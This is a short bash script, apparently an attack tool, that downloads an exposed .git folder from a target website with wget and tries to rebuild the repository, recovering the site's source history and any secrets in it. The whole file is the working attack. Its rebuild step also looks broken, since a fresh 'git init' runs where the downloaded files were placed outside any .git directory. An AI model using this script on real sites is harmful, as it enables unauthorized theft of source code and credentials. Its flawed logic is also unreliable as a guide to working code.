#!/bin/bash
# git_extractor.sh - Download and extract exposed .git folder from web root
#
# Usage:
#   ./git_extractor.sh <target_url>
#   ./git_extractor.sh -h
#
# Example:
#   ./git_extractor.sh http://example.com/.git/

usage() {
  echo "Usage: $0 <url_to_.git_folder>"
  echo "Example: $0 http://target.com/.git/"
  exit 0
}

if [[ "$1" == "-h" || "$1" == "--help" || -z "$1" ]]; then
  usage
fi

URL="$1"
OUTDIR="git_leak_$(basename "$URL")"

mkdir -p "$OUTDIR"
echo "[*] Downloading .git directory from $URL..."
wget -r -np -nH --cut-dirs=1 -R "index.html*" "$URL" -P "$OUTDIR"

echo "[*] Attempting to rebuild repository..."
cd "$OUTDIR" || exit
git init > /dev/null
git checkout . 2>/dev/null && echo "[+] Repo rebuilt in $OUTDIR" || echo "[!] Partial extraction or error rebuilding repo."
